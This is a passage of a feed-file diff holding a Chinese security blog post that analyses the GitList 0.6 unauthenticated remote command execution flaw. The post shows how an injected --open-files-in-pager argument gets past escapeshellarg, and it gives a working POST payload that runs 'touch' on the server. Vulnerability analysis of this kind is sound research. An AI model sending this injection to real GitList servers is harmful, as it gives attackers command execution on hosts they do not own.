. $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
+<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
+<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
+<blockquote>
+<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
+</blockquote>
+<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
+<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
+<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
+<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
+<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
+<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
+<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
+<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
     
   </entry>
   
